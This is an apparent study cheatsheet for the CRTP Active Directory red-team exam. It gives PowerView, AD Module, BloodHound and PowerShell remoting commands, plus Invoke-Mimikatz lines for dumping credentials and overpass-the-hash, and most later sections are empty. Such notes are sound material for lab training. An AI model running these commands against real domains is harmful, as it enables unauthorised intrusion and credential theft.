# Certified Red Team Professional (Pentester Academy)

Cheatsheet for the [CRTP exam](https://www.pentesteracademy.com/activedirectorylab)

*All the commands below have been tested.*

:heart: Powershell

# Summary

 - [Domain Enumeration](#-domain-enumeration)
   - [Domain](#-domain)
   - [Users](#-users)
   - [Computers](#-computers)
   - [Groups](#-groups)
   - [Logged-in users](#-logged-in-users)
   - [Share and sensitive files](#-share-and-sensitive-files)
   - [Group policy objects](#-group-policy-objects)
   - [Organizational unit](#-organizational-unit)
   - [Access control list](#-access-control-list)
   - [Trusts](#-trusts)
   - [Forests](#-forests)
   - [User hunting](#-user-hunting)
 - [Local Privilege Escalation](#-local-privilege-escalation)
 - [BloodHound](#-bloodhound)
 - [Lateral Movement](#-lateral-movement)
   - [Powershell remoting](#-powershell-remoting)
   - [Invoke-Mimikatz](#-invoke-mimikatz)
 - [Domain PrivEsc](#-domain-privesc)
   - [Kerberoast](#-kerberoast)
 * [Domain Persistence](#-domain-persistence)
 * [Enterprise PrivEsc](#-enterprise-privesc)
 * [Enterprise Persistence](#-enterprise-persistence)
 * [Cross Forest Attacks](#-cross-forest-attacks)
 * [Detection And Defense](#-detection-and-defense)

## [](#summary) Domain Enumeration

Two ways:
- [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) - `@harmj0y`
- [AD Module](https://github.com/samratashok/ADModule) - `@nikhil_mitt`

### [](#-domain) Domain

| Powerview | AD Module | Information |
|-----------|-----------|-------------|
| `Get-NetDomain` | `Get-ADDomain` | domain |
| `Get-NetDomain -Domain {DOMAIN}` | `Get-ADDomain -Identity {DOMAIN}` | other domain |
| `Get-DomainSID` | `(Get-ADDomain).DomainSID` | domain SID |
| `Get-DomainPolicy` | / | domain policy |
| `Get-DomainPolicy -Domain {DOMAIN}` | / | policy for another domain |
| `Get-NetDomainController` | `Get-ADDomainController` | domain controllers |
| `Get-NetDomainController -Domain {DOMAIN}` | `Get-ADDomainController -DomainName {DOMAIN} -Discover` | domain controllers for another domain |

### [](#-users) Users

| Powerview | AD Module | Information |
|-----------|-----------|-------------|
| `Get-NetUser` | `Get-ADUser -Filter * -Properties *` | domain users |
| `Get-NetUser -UserName {USER}` | `Get-ADUser -Identity {USER} -Properties *` | specific user |
| `Get-UserProperty` | `Get-ADUser -Filter * -Properties * \| select -First 1 \| Get-Member -MemberType *Property \| select Name` | list user properties |
| `Get-UserProperty -Properties {PROPERTY}` | `Get-ADUser -Filter * -Properties * \| select name,@{expression={[datetime]::fromFileTime($_.{PROPERTY})}}` | specific property |

### [](#-computers) Computers

| Powerview | AD Module | Information |
|-----------|-----------|-------------|
| `Get-Netcomputer` | `Get-ADComputer -Filter * \| select Name` | domain computers |
| `Get-NetComputer -OperatingSystem "*Server 2016*"` | `Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem \| select Name,OperatingSystem` | list the machines whose OS is server 2016 |
| `Get-NetComputer -Ping` | `Get-ADComputer -Filter * -Properties DNSHostName \| %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}` | ping hosts |
| `Get-NetComputer -FullData` | `Get-ADComputer -Filter * -Properties *` | get all properties |

### [](#-groups) Groups

| Powerview | AD Module | Information |
|-----------|-----------|-------------|
| `Get-Netgroup` | `Get-ADGroup -Filter * \| select Name` | domain groups |
| `Get-Netgroup -Domain {DOMAIN}` | `/` | domain groups for another domain |
| `Get-Netgroup -FullData` | `Get-ADGroup -Filter * -Properties *` | all properties |
| `Get-Netgroup *{WORD}*` | `Get-ADGroup -Filter 'Name -like "*{WORD}*"' \| select Name` | get all groups containing a particular word in the name |
| `Get-NetGroupMember -GroupName "{GROUP}" -Recurse` | `Get-ADGroupMember -Identity "{GROUP}" -Recursive` | get all members of a group |
| `Get-NetGroup -UserName {USER}` | `Get-ADPrincipalGroupMembership -Identity {USER}` | list the groups of a user |
| `Get-NetLocalGroup -ComputerName {TARGET} -ListGroups` | `/` | list all the local groups on a machine :warning: need admin priv |
| `Get-NetLocalGroup -ComputerName {TARGET} -Recurse` | `/` | get members of all the local groups on a machine :warning: need admin priv |

### [](#-logged-in-users) Logged-in users

| Powerview | Information |
|-----------|-----------|
| `Get-NetLoggedon -ComputerName {TARGET}` | return the logged users on a local (or a remote) machine :warning: need admin priv |
| `Get-LoggedonLocal -ComputerName {TARGET}` | get locally loggued users on a machine :warning: need remote registry |
| `Get-LastLoggedOn -ComputerName {TARGET}` | get the last loggued user on a machine :warning: need admin priv and remote registry |

### [](#-share-and-sensitive-files) Share and sensitive files

| Powerview | Information |
|-----------|-----------|
| `Invoke-ShareFinder -Verbose` | finds (non-standard) shares on hosts in the local domain |
| `Invoke-FileFinder -Verbose` | find sensitive files on hosts in the local domain |
| `Get-NetFileServer` | get a list of file servers used by current domain users |

### [](#-group-policy-objects) Group policy objects

| Powerview | AD Module | Information |
|-----------|-----------|-------------|
| `Get-NetGPO` | `Get-GPO -All` | list all GPOs |
| `Get-NetGPO -ComputerName {TARGET}` | | lists the GPOs on a specific computer |
| `Get-NetGPOGroup` | | gets all GPOs in a domain that set "Restricted Groups" |
| `Find-GPOComputerAdmin -ComputerName {TARGET}` | | list users of local group using GPO |
| `Find-GPOLocation -UserName {USER} -Verbose` | | get the location of GPOs for a specific user |

### [](#-ou) Organizational unit

| Powerview | AD Module | Information |
|-----------|-----------|-------------|
| `Get-NetOU -FullData` | `Get-ADOrganizationalUnit -Filter * -Properties *` | list all the OUs in the domain |
| `Get-NetOU -OUName {OU} \| %{Get-NetComputer -ADSpath $_}` | | list the computers in a specific OU |
| `(Get-NetOU {OU} -FullData).gplink` | `Get-GPO -Guid {GPLINK}` | list a specific GPO applied to an OU |

### [](#-access-control-list) Access control list

| Powerview | Information |
|-----------|-------------|
| `Get-ObjectAcl -SamAccountName {object} -ResolveGUIDs -Verbose` | list the ACLs associated with a specific object (user, group...) |
| `Get-ObjectAcl -ADSprefix '{PREFIX}' -Verbose` | list the ACLs associated with the specified prefix to be used for the search |
| `Get-ObjectAcl -ADSpath {LDAP_PATH} -ResolveGUIDs -Verbose` | list the ACLs associated with a specific LDAP path |
| `Invoke-ACLScanner -ResolveGUIDs` | find interesting ACLs |
| `Invoke-ACLScanner -ResolveGUIDs \| ?{$_.IdentityReference -match "{USERS/GROUPS}"}` | find interesting ACLs for specific user/group |
| `Get-PathAcl -Path "\\{TARGET_PATH}"` | list of ACLs associated with a specific path |

### [](#-trusts) Trusts

| Powerview | AD Module | Information |
|-----------|-----------|-------------|
| `Get-NetDomainTrust` | `Get-ADTrust -Filter *` | list all trust relationships between domains in the current domain |
| `Get-NetDomainTrust -Domain {DOMAIN}` | `Get-ADTrust -Identity {DOMAIN}` | lists all trust relationships between domains in another domain |

### [](#-forests) Forests

| Powerview | AD Module | Information |
|-----------|-----------|-------------|
| `Get-NetForest` | `Get-ADForest` | get information about the current forest |
| `Get-NetForest -Forest {FOREST}` | `Get-ADForest -Identity {FOREST}` | get information about another forest |
| `Get-NetForestDomain` | `(Get-ADForest).Domains` | list all domains of the current forest |
| `Get-NetForestDomain -Forest {FOREST}` | | list all domain of another forest |
| `Get-NetForestDomain -Verbose \| Get-NetDomainTrust \| ?{$_.TrustType -eq 'External'}` | | get the external forests |
| `Get-NetForestTrust` | `Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'` | mapping the trust relationships of one forest |
| `Get-NetForestTrust -Forest {FOREST}` | | mapping the trust relationships of another forest |

### [](#-user-hunting) User hunting

| Powerview | Information |
|-----------|-------------|
| `Find-LocalAdminAccess -Verbose` | find all machines on the current domain where the current user has local admin access |
| `Find-WMILocalAdminAccess` | same but with WMI |
| `Find-PSRemotingLocalAdminAccess` | same but with PS Remoting |
| `Invoke-EnumerateLocalAdmin -Verbose` | find local administrators on all machines in the domain ⚠️ requires admin rights on non-DC machines |
| `Invoke-UserHunter -UserName/GroupName "{USER/GROUP}"` | find computers where a domain admin (or user/group) has sessions |
| `Invoke-UserHunter -CheckAccess` | to confirm access |
| `Invoke-UserHunter -Stealth` | find machines where a domain admin is logged in |

## [](#table-of-contents) Local Privilege Escalation

Several tools:
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) - `@harmj0y`
- [BeRoot](https://github.com/AlessandroZ/BeRoot) - `@Alessandro Zanni`
- [PrivEsc](https://github.com/enjoiz/Privesc/blob/master/privesc.ps1) - `@Jakub Palaczynski`

| Tool | Cmd | Information |
|-----------|-----------|-------------|
| PowerUp | `Invoke-AllChecks` | check common misconfigurations to find a way to escalate our privilege |
| BeRoot | `.\beRoot.exe` | same |
| privesc | `Invoke-PrivEsc` | same |

## [](#table-of-contents) BloodHound

[BloodHound](https://github.com/BloodHoundAD/BloodHound) was created by `@_wald0`, `@CptJesus`, and `@harmj0y`. The tool uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. To use it, you need several components:
- SharpHound - is used for collect the data
- Neo4j - is a graph database management system developed by Neo4j, Inc.
- BloodHound

[Documentation](https://bloodhound.readthedocs.io/en/latest/index.html)

### Using SharpHound to collect data

```powershell
. .\C:\AD\BloodHound-master\Ingestors\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Verbose # collects all data from the domain
Invoke-BloodHound -CollectionMethod LoggedOn -Verbose # for the sessions
```

### Installation of Neo4j

```powershell
cd C:\AD\neo4j-community-4.1.1\bin>
.\neo4j.bat install-service
.\neo4j.bat start
```

After collecting the data and starting Neo4j, you can go to the URL http://localhost:7474 to change de default creds *neo4j:neo4j*.
Once this is done, close the browser, go to the `BloodHound-win32-x64` folder and launch bloodhound.

Finally, click on `Upload Data` and select the .zip file that contains the domain data.

## [](#table-of-contents) Lateral Movement

### [](#-powershell-remoting) Powershell remoting

PS Remoting allows you to run any Windows PowerShell command on one or more remote computers. You can establish persistent connections, start interactive sessions and run scripts on remote computers.

[Documentation](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2)

Access with PS Remoting to a remote machine (WINRM|5985/tcp)

```powershell
Enter-PSSession -ComputerName {TARGET}

# with stateful
$sess = New-PSSession -ComputerName {TARGET}
Enter-PSSession -Session $sess
```

Running commands on remote machine

```powershell
Invoke-Command -ComputerName {TARGET} -ScriptBlock {whoami;hostname}
```

Loading a script on a remote machine

```powershell
Invoke-Command -ComputerName {TARGET} -FilePath '{FILEPATH}'

# or

$sess = New-PSSession -ComputerName {TARGET}
Invoke-Command -FilePath {FILEPATH}
Enter-PSSession -Session $sess
```

### [](#-invoke-mimikatz) Invoke-Mimikatz

[Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) is a PowerSploit module created by `@JosephBialek`. It loads Mimikatz 2.0 into memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any functionality provided with Mimikatz.

Dump credentials on a local machine

```powershell
Invoke-Mimikatz -DumpCreds
```

Dump credentials from multiple remote machines

```powershell
Invoke-Mimikatz -DumpCreds -ComputerName@("sys1","sys2")
```

[Over pass the hash](https://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash) - generate tokens from hashes.

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:{USER} /domain:{DOMAIN} /ntlm:{NTLM_HASH} /run:powershell.exe"'
```

## [](#table-of-contents) Domain PrivEsc

### [](#-kerberoast) Kerberoast

Soon

## [↑](#table-of-contents) Domain Persistence

## [↑](#table-of-contents) Enterprise PrivEsc

## [↑](#table-of-contents) Enterprise Persistence

## [↑](#table-of-contents) Cross Forest Attacks

## [↑](#table-of-contents) Detection And Defense

Enumération (voir cours enum)

